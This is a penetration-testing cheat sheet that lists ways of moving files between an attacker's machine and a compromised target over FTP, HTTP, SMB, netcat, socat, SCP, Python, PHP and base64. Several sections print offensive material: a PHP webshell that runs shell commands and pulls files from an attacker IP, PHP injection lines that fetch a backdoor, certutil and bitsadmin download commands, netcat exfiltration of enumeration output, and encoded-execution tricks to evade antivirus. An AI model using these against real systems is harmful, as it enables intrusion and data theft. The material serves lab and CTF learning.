# 1001 ways of moving files around in a network

Ever had to work with a remote host that seemed to resist any attempt to transfer files from/to it? Dread no more! Here are 1001 (not really) ways to exchange files in a network.

**Note:** The server commands assume you are working on a Linux machine (Kali, Parrot, Debian, etc.). But since most of these are Python-based, they should also work on Windows or anywhere else.

### Table of Content

1. [FTP](./file_transfers.md#ftp)
2. [HTTP](./file_transfers.md#http)
3. [SMB](./file_transfers.md#smb)
4. [Netcat](./file_transfers.md#netcat)
5. [SSH/SCP](./file_transfers.md#sshscp)
6. [Python](./file_transfers.md#python)
7. [PHP](./file_transfers.md#php)
8. [NFS](./file_transfers.md#nfs)
9. [RDP](./file_transfers.md#rdp)
10. [Copy&Paste](./file_transfers.md#copy-paste)

## FTP

The classic.

**Start an instant FTP server with python3:**

```bash
sudo python3 -m pyftpdlib -w -p 21
```

This allows `anonymous:anonymous` login to your local machine from a remote host with Read/Write permissions, so be careful. The current working directory in the terminal will be the FTP root directory.

Version with limited login:

```bash
sudo python3 -m pyftpdlib -w -p 21 --username=cerealman --password=hunter2
```

Install with: `sudo pip3 install pyftpdlib`

### General FTP client commands

**Important:** Set the client to `binary` mode for proper 1-to-1 file transfer! 

In `ascii` mode (usually default) your binaries will get mangled when transferred.

The `ascii` mode is only useful when you want to transfer scripts written on linux to windows, because it changes LF line endings to CRLF, the Windows default line ending.

```bash
# list files, current dir, change dir, make dir
ftp> ls
ftp> pwd
ftp> cd <dir>
ftp> mkdir <dir>

# transfer files
ftp> binary
ftp> get <filename>
ftp> put <filename>

# download/upload all files in current dir
# turn off prompt for y/n on every file
ftp> binary
ftp> prompt
ftp> mget *
ftp> mput *

# change local (your own) working directory
ftp> lcd /tmp/stuff/

# Get shell / Escape shell
ftp> !
ftp> !ls

# other stuff
ftp> delete <file>
ftp> rename <oldname> <newname>

# close connection
ftp> exit
```

### Linux FTP client

Connect to ftp:

```bash
ftp 192.168.0.1
```
```bash
ftp user@target.htb
```

Mass download content:
```bash
curl ftp://ftp.com/mp3/* --user login:password -o /myfolder/*

wget -r --user="user@login" --password="Pa$$wo|^D" ftp://server.com/
```

### Windows FTP client

Via build-in ftp client on cmd:

```default
$ ftp
ftp> open ftp.domain.com
ftp> ...
```

#### Powershell 

Upload a file to a remote FTP server:

```powershell
$target = "ftp://10.0.2.4/test_file.txt"
$file = "C:\Users\admin\Desktop\ftptest\test_file.txt"
$resp = $wc.UploadFile($target, $file)
```

## HTTP

```bash
 ____  ____  _________  _________  _______          __  __ 
|_   ||   _||  _   _  ||  _   _  ||_   __ \  _     / / / / 
  | |__| |  |_/ | | \_||_/ | | \_|  | |__) |(_)   / / / /  
  |  __  |      | |        | |      |  ___/  _   / / / /   
 _| |  | |_    _| |_      _| |_    _| |_    (_) / / / /    
|____||____|  |_____|    |_____|  |_____|      /_/ /_/     
```

If you just want to download a file to a target, then this is usually your best choice. Outgoing HTTP requests are rarely blocked (Because that would make most of the Internet unusable).

**Start an instant HTTP server:**
```bash
# Build-in python3 http server
python3 -m http.server 8080

# For the low port you will need sudo/root
sudo python3 -m http.server 80

# Python 2 variant
python -m SimpleHTTPServer <port>
```

Like with the other instant-servers, this one uses the current directory as base for serving files. 

This particular server only supports downloads via GET requests though. So for POST file uploads you will require a more complex HTTP server.

### Download files

If you have a GUI, then you can obviously also just use whatever browser is installed and navigate to `http://<your-ip>/somefile.txt` wherein somefile.txt is what you want to download. The Python servers above also offer directory listing if you go to the base directory `http://<your-ip>/`

#### Linux

You know the usual suspects:
```bash
curl http://<your_ip>/somefile.sh -o somefile.sh
```
```bash
wget http://<your_ip>/somefile.sh
```

#### Windows

Powershell:
```powershell
$client = new-object System.Net.WebClient
$client.DownloadFile("http://www.xyz.net/file.txt","C:\tmp\file.txt")

# As one-liner
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"
```

Windows 10 often includes curl.exe:
```default
# example 1
curl.exe --output index.html --url https://somehost.com
# example 2
curl.exe -o index.html https://somehost.com
```

Bitsadmin:
```default
bitsadmin /transfer myDownloadJob /download /priority normal http://somehost/somefile.zip c:\somefile.zip
```

Certutil:
```default
certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
```

Cscript:

Create script file `wget.js`:
```default
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
WScript.Echo(WinHttpReq.ResponseText);

/* To save a binary file use this code instead of previous line
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile("out.bin");
*/
```
Execute:
```default
cscript /nologo wget.js http://example.com
```


## SMB
```bash
        (>,                      
    ,<)oo |\                     
   / 88 "}| \                    
  | `., ., ,'  (      *          
   `-.'`')'    )\ ) (  `     (   
      ) /     (()/( )\))(  ( )\  
     / (__,_   /(_)|(_)()\ )((_) 
    |   (-,/  (_)) (_()((_|(_)_  
  .'    ) /   / __||  \/  || _ ) 
   `._,\ '`-  \__ \| |\/| || _ \ 
       `\     |___/|_|  |_||___/ 
       -`'                       
```
SMB (or Samba) is the preffered choice of anyone who has to work with Windows targets. The brazillian dancer is incredibly easy to use, you can just use the Windows `copy` command to transfer files to the target. Thanks to the Impacket project you can also use your regular Kali Linux machine to interact with SMB servers and even host your own SMB server on the fly.

**Start instant local SMB server:**
```bash
# Impacket SMB server.
sudo smbserver.py EVILSHARE .

# With SMB2 support (experimental, but works fine)
sudo smbserver.py EVILSHARE . -smb2support

# With username/password restriction
sudo smbserver.py EVILSHARE . -username cerealman -password iloveyou
```

Like with the FTP server above, this will use the current directory as base directory for the share.

Install (on Kali): `sudo apt install impacket`

Without the Kali repositories you will have to manually install / download Impacket from their github. Link: https://github.com/SecureAuthCorp/impacket

### On Windows

After starting the SMB server on your Kali machine, on the Windows target you can just do (in CMD or powershell):

```default
# Download file
copy \\<your_kali_ip>\EVILSHARE\exploit.exe
copy \\<your_kali_ip>\EVILSHARE\exploit.exe C:\Temp\harmless.exe

# upload file:
copy localfile.txt \\<your_kali_ip>\EVILSHARE\localfile.txt
```
Incredibly easy.

You can execute scritps/binaries without even copying them:
```default
\\<your_kali_ip>\EVILSHARE\coolscript.bat

# script output here...
```

For completeness sake, you can also mount the share if you have the permissions:
```default
# mount CIFS
net use X: \\<your_kali_ip>\EVILSHARE

# dismount CIFS
net use X: /delete

# mount with username/password
net use X: \\<your_kali_ip>\EVILSHARE /user:[user] [password]
```


## Netcat

```default
 /$$   /$$             /$$      /$$$$$$   /$$$$$$  /$$$$$$$$
| $$$ | $$            | $$     /$$__  $$ /$$__  $$|__  $$__/
| $$$$| $$  /$$$$$$  /$$$$$$  | $$  \__/| $$  \ $$   | $$   
| $$ $$ $$ /$$__  $$|_  $$_/  | $$      | $$$$$$$$   | $$   
| $$  $$$$| $$$$$$$$  | $$    | $$      | $$__  $$   | $$   
| $$\  $$$| $$_____/  | $$ /$$| $$    $$| $$  | $$   | $$   
| $$ \  $$|  $$$$$$$  |  $$$$/|  $$$$$$/| $$  | $$   | $$   
|__/  \__/ \_______/   \___/   \______/ |__/  |__/   |__/   

```

This is especially relevant in the linux/bsd sphere, where you will often find some flavor of netcat installed. Finding netcat installed on a Windows machine is less common (outside of CTFs).

### Transfer files via reverse connect

Upload from target to your own machine:

```bash
# On your own machine listen for a connection
nc -vlnp 4545 > some_enum.txt
```
```bash
# On the remote target machine, connect to the listener
nc [your_kali_ip] 4545 < some_enum.txt
```

Download to target from your own machine:

```bash
# On your own machine listen for a connection
nc -vlnp 4545 < some_enum.txt
```
```bash
# On the remote target machine, connect to the listener
nc [your_kali_ip] 4545 > some_enum.txt
```

Depending on your nc implementation, you might have to use `CTRL+C` on your end to exit, if the connection does not end on its own after transfering the file. Just check if the filesize fits.

A possible solution is the `-q 0` paramter. It ends the connection 0 seconds after an EOF is reached.

Use `md5sum <filename>` on both machines to ensure file entegrity after the transfer (if it matters).

### Other netcat flavors 
```bash
# bsd netcat
nc -vl 44444 > received_file.txt
nc -N 10.11.12.10 44444 < sending_file.txt
```
```bash
# Nmap Ncat
ncat -l 5555 > file.txt
cat file.txt | ncat [IP_of_Server] 5555
```

### Via bind connect

Of course you can also do it the other way around and start the listener on the target machine. But then you are more likely to run into firewall / permission issues. 

Just reverse the above commands. The process is identical.


## Socat

```default
   _____        _____       _______ 
  / ____|      / ____|   /\|__   __|    /\_/\  (  
 | (___   ___ | |       /  \  | |      ( ^.^ ) _) 
  \___ \ / _ \| |      / /\ \ | |        \"/  (
  ____) | (_) | |____ / ____ \| |      ( | | )
 |_____/ \___/ \_____/_/    \_\_|     (__d b__)

```

Socat can do basically do all of the things Netcat can do (*in a more complex, harder to memorize syntax*) and more! But of particular interest is the ability to encrypt a connection.

Regular TCP file transfer:
```bash
socat -u FILE:"/tmp/whatever/test.txt" TCP-LISTEN:5778,reuseaddr
```

Connect and download:
```bash
socat -u TCP:192.168.1.97:5778 STDOUT > /tmp/target/test.txt
```

### SSL/TLS encrypted

Create cert on server side:
```bash
openssl genrsa -out /tmp/whatever/socat.key 4048
openssl req -new -key /tmp/whatever/socat.key -x509 -days 3653 -out /tmp/whatever/socat.crt
cat /tmp/whatever/socat.key /tmp/whatever/socat.crt > /tmp/whatever/socat.pem
chmod 600 /tmp/whatever/socat.key /tmp/whatever/socat.pem
```

#### Download file to target

Start listener:
```bash
socat -u FILE:"/tmp/whatever/download.txt" openssl-listen:5778,reuseaddr,cert=/tmp/whatever/socat.pem,verify=0
```

Connect and download file:
```bash
socat -u openssl-connect:10.0.2.4:5778 STDOUT,verify=0 > /tmp/target/downloaded.txt
```

#### Upload file from target
Start listener:
```bash
socat -u openssl-listen:5778,reuseaddr,cert=/tmp/whatever/socat.pem,verify=0 STDOUT > /tmp/whatever/uploaded.txt
```

Connect and upload:
```bash
socat -u FILE:"/tmp/whatever/upload.txt" openssl-connect:10.0.2.4:5778,verify=0
```


## SSH/SCP

```default
+--[ SSH SCP ]----+ 
|      .-""-.     |
|     / .--. \    |
|    / /    \ \   |
|    | |    | |   |
|    | |.-""-.|   |
|   ///`.::::.`\  |
|  ||| ::/  \:: ; |
|  ||; ::\__/:: ; |
|   \\\ '::::' /  |
|    `=':-..-'`   |
+-----------------+
```

Secure file copying via SSH can be achieved with the SCP tool. If a machine has OpenSSH, then you can expect that it also has this tool installed.

```bash
scp <source> <destination>
```

Example:
```bash
scp SourceFile user@host:/directory/TargetFile
```

Some Params:
```bash
-P # Specifies the remote host ssh port.
-p # Preserves files modification and access times.
-q # Use this option if you want to suppress the progress meter and non-error messages.
-C # This option forces scp to compresses the data as it is sent to the destination machine.
-r # This option tells scp to copy directories recursively
-i ~/.ssh/id_rsa # SSH identity key file
```

## Python
```default
              .::::::::::.               
            .::``::::::::::.             
            :::..:::::::::::             
            ````````::::::::             
    .::::::::::::::::::::::: iiiiiii,    
 .:::::::::::::::::::::::::: iiiiiiiii.  
 ::::::::::::::::::::::::::: iiiiiiiiii  
 ::::::::::::::::::::::::::: iiiiiiiiii  
 :::::::::: ,,,,,,,,,,,,,,,,,iiiiiiiiii  
 :::::::::: iiiiiiiiiiiiiiiiiiiiiiiiiii  
 `::::::::: iiiiiiiiiiiiiiiiiiiiiiiiii`  
    `:::::: iiiiiiiiiiiiiiiiiiiiiii`     
            iiiiiiii,,,,,,,,             
            iiiiiiiiiii''iii             
            `iiiiiiiiii..ii`             
              `iiiiiiiiii`               
```

### Upload files

Maybe the target is a Linux machine. You can download files via HTTP and curl/wget, but how do you upload the results of your enum script?

Well if Python is installed, then you can just use this simple script:

```python
#!/usr/bin/python
# U+0A75
import socket
import sys
if (len(sys.argv) < 2):
    print("params: <ip> <filename>")
    print("listen port is 4545")
    sys.exit(0)
target = sys.argv[1]
filename = sys.argv[2]
s = socket.socket()
s.connect((target, 4545))
f = open (filename, "rb")
l = f.read(1024)
while (l):
    s.send(l)
    l = f.read(1024)
s.close()
```

On your own machine start a netcat listener:

```bash
nc -vlnp 4545 > file_output.txt
```

And on the target run the script:

```bash
python upload.py <your_ip> ./file_output.txt
```

The script is compatible with both Python 2.7 and 3.


### Download files

It's unlikely that you will need this, but for completeness sake, here is the same script adapted to downloading files instead:

```python
#!/usr/bin/python
# U+0A75
import socket
import sys
if (len(sys.argv) < 2):
    print("params: <ip> <filename>")
    print("listen port is 4545")
    sys.exit(0)
target = sys.argv[1]
filename = sys.argv[2]
s = socket.socket()
s.connect((target, 4545))
f = open (filename, "ab")
res = s.recv(1024)
while (res):
    f.write(res)
    res = s.recv(1024) 
s.close()
```

On your own machine start a netcat listener:
```bash
nc -q 0 -vlnp 4545 < linpeas.sh
```

On the target receive the file with the python script:
```bash
python download.py <your_ip> linpeas.sh
```

## PHP

Quite often you might gain code execution via PHP injection, but you need to download some file or another in order to gain a full shell.

Here are some functions that allow you to download files:

```html
<!-- Download file via HTTP and copy() function -->
<?php  echo copy("http://10.0.2.4/qsd-php-backdoor.php", "qsd-php-backdoor.php");  ?> 
```

Here you would serve the file in question via a HTTP server (see HTTP section). Replace the IP with your own obviously.

Another way:
```html
<!-- Download file via HTTP and file_put_contents() and file_get_contents() functions -->
<?php  file_put_contents("somefile.php", file_get_contents("http://10.10.14.21/somefile.php"));  ?>
```

Here is a webshell with build-in upload function, using the above:
```php
<?php
  if (isset($_REQUEST['upload'])) {
    file_put_contents($_REQUEST['upload'], file_get_contents("http://10.0.2.4/" . $_REQUEST['upload']));
  };
  if (isset($_REQUEST['cmd'])) {
    echo '<pre>' . shell_exec(urldecode($_GET['cmd'])) . '</pre>';
  };
?>
```

Replace the IP address with your own obviously.

Example usage: 

* `http://target.host/webshell.php?cmd=whoami`
* `http://target.host/webshell.php?upload=linpeas.sh`


## NFS

Show available shares on an NFS server:
```bash
showmount -e 192.168.0.42
```

Mount an NFS share:

```bash
mkdir /tmp/infosec
mount -t nfs 192.168.0.42:/someshare /tmp/infosec
```

Unmount:

```bash
umount /tmp/infosec
```

## RDP

```bash
mkdir /tmp/shareme
rdesktop 192.168.0.42 -r disk:share=/tmp/shareme
```

Once you log into an account on the remote machine you will find the shared directory in the file explorer under network places.


## Copy-Paste
```default
 _______  _______  ______    ___        _     _______ 
|       ||       ||    _ |  |   |     _| |_  |       |
|       ||_     _||   | ||  |   |    |_   _| |       |
|       |  |   |  |   |_||_ |   |      |_|   |       |
|      _|  |   |  |    __  ||   |___         |      _|
|     |_   |   |  |   |  | ||       |        |     |_ 
|_______|  |___|  |___|  |_||_______|        |_______|
 _______  _______  ______    ___        _     __   __ 
|       ||       ||    _ |  |   |     _| |_  |  | |  |
|       ||_     _||   | ||  |   |    |_   _| |  |_|  |
|       |  |   |  |   |_||_ |   |      |_|   |       |
|      _|  |   |  |    __  ||   |___         |       |
|     |_   |   |  |   |  | ||       |         |     | 
|_______|  |___|  |___|  |_||_______|          |___|  
```

If everything fails you might have to do the unthinkable and copy-paste the content of a file in the terminal (shock horror).

Another possibility is that a particularly nasty antivirus quarantines your files the moment they touch the harddrive. Or maybe you cannot find any writable directory and you need to work in memory only.

Pasting file content into a terminal usually comes along with a bunch of problems, especially with new-line and whitespace characters, incompatible charsets, etc. Which tend to break your precious reverse shells or lead to unintended command executions of individual lines.

### Base64 encoding

Encoding files as base64 creates a nice uniform blob of printable utf-8 characters without whitespace, control characters or other nastiness. And it allows you to transfer binary content as well as clear text. You can even use it as url parameter.

#### Linux

Encode content as base64:
```bash
# encode (and print in console)
echo 'some text hey ho yoho' | base64
```
```bash
cat somefile.so | base64
```
```bash
# Or pipe the base64 output into a file
cat somefile.so | base64 > encoded.txt
```

Decode base64 content:

```bash
# decode
echo 'c29tZSB0ZXh0IGhleSBobyB5b2hvCg==' | base64 --decode
```
```bash
# decode and pipe into file
echo 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMyAK...' | base64 --decode > somescript.py
```
```bash
# decode from file to file
cat encoded.txt | base64 --decode > somefile.so
```

#### Windows

Encode content as base64:
```default
certutil -encode inputFileName encodedOutputFileName
```

Decode base64 content:
```default
certutil -decode encodedInputFileName decodedOutputFileName
```

Encode with Powershell:
```default
$pwd =[System.Text.Encoding]::UTF8.GetBytes("Ein Test")
[Convert]::ToBase64String($pwd)
```
```default
$base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FileName))
```

Decode with Powershell:
```default
$pwd = [Convert]::FromBase64String("RWluIFRlc3Q=")
[System.Text.Encoding]::UTF8.GetString($pwd)
```
```default
[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($base64string))
```

#### Python

You can also encode python scripts as base64 and then straight up execute them:
```bash
python -c "exec('aW1wb3J0IG9zICAgICAgICA7ICBpbXBvcnQgcHR5I....'.decode('base64'))"
```

Use this script to minimize and encode your python script:

https://gist.github.com/ropnop/d477ed1cf7f78c1296e0a2f20b5d925f

#### Powershell

The same works with Powershell. Execute Base64 encoded script:

```bash
powershell.exe -encodedCommand JwBtAGkAaw[...]
```
